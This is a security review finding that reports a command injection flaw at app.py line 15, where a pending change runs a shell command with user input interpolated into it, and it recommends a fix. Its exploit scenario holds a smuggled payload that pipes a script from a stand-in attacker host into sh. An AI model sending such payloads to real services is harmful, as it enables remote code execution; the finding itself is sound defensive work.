# Vuln 1: Command Injection: `app.py:15`

- Severity: HIGH
- Category: Injection & Code Execution
- Confidence: 0.99
- Description: The pending change replaces a safe argument-vector subprocess call with a shell command string and `shell=True`, while interpolating the user-controlled `target` value directly into that command. Shell metacharacters in `target` such as `;`, `&&`, backticks, `$()`, or redirections will be interpreted by the shell before `/usr/local/bin/archive-job` runs, so the request body can inject arbitrary commands.
- Exploit Scenario: Any attacker who can send a request with a valid `X-Ops-Token` can submit a payload like `{"target":"/srv/data; curl https://attacker.example/p.sh | sh"}` to `/archive`. The service will execute the injected shell pipeline with the privileges of the Flask process, turning the archive endpoint into a remote code execution primitive.
- Recommendation: Do not invoke the shell for this operation. Restore argument-list execution such as `subprocess.run(["/usr/local/bin/archive-job", "--target", target], shell=False, ...)` so `target` is passed as data rather than parsed by a shell. If additional validation is needed, enforce a strict allowlist for expected path formats.
